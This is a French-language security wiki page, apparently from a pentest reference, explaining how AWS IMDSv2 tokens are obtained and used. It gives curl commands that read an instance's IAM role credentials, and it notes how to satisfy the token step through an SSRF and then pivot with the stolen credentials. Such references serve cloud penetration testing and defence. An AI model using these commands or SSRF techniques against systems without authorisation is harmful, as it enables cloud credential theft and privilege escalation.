---
title: "IMDSv2 : le flux de jeton et le satisfaire depuis un SSRF"
description: "Obtenir un jeton de session avec une requête PUT et l'utiliser pour lire les credentials de rôle IMDSv2, y compris depuis des chaînes SSRF capables de définir des en-têtes de requête."
keywords:
  - IMDSv2
  - jeton de session
  - PUT
  - rôle d'instance
  - SSRF
---

# IMDSv2

IMDSv2 exige un jeton de session à courte durée de vie obtenu avec un `PUT`, puis renvoyé dans un en-tête à chaque lecture. C'est trivial depuis un shell sur l'instance, et toujours atteignable depuis un [SSRF](ssrf.md) lorsque la primitive de requête peut émettre un `PUT` et définir l'en-tête du jeton.

## Le flux de jeton

```bash
TOKEN=$(curl -sX PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
```

## Notes d'exploitation

- L'exigence du `PUT` et de l'en-tête personnalisé bloque les primitives SSRF les plus simples ; un SSRF avec request-smuggling complet ou en-tête contrôlable la satisfait tout de même.
- Le TTL du jeton peut atteindre six heures, de sorte qu'un seul jeton couvre une longue session de lectures.
- Une hop-limit de 1 est courante ; un SSRF depuis un conteneur sur l'hôte peut échouer à la vérification de saut alors qu'un shell sur la machine réussit.
- Les credentials de rôle récupérés débloquent ensuite les API qui renvoient des credentials (`sts:AssumeRole`, `ecr:GetAuthorizationToken`, `sso:GetRoleCredentials`, et les autres) pour élargir l'accès ; voir [courtiers de credentials](../credential-brokers.md).

## Outils

- **curl** sur l'instance, ou une primitive SSRF avec contrôle de la méthode et des en-têtes.
- **Pacu** (`ec2__metadata`) : gère automatiquement la danse du jeton.

## Références

- [AWS: how IMDSv2 works](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [HackTricks Cloud: IMDSv2](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
